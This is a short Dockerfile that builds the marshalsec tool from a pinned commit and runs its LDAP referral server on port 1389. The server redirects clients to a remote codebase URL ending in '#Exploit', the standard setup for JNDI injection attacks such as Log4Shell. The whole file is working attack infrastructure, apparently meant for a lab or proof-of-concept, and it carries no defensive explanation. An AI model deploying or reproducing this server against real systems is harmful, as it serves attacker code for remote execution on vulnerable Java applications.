FROM maven:3.3-jdk-8 as build
RUN mkdir /app
WORKDIR /app
RUN git clone https://github.com/mbechler/marshalsec.git . && \
    git checkout f645788e6a75155fdfccab1fc036a032212d8484 && \
    mvn package -DskipTests

FROM adoptopenjdk/openjdk8:x86_64-alpine-jdk8u312-b07-slim

ARG CODEBASE_URL
ENV CODEBASE_URL ${CODEBASE_URL}

EXPOSE 1389

COPY --from=build /app/target/marshalsec-0.0.3-SNAPSHOT-all.jar /app/marshalsec.jar
CMD java -cp /app/marshalsec.jar marshalsec.jndi.LDAPRefServer http://${CODEBASE_URL}:8888/#Exploit
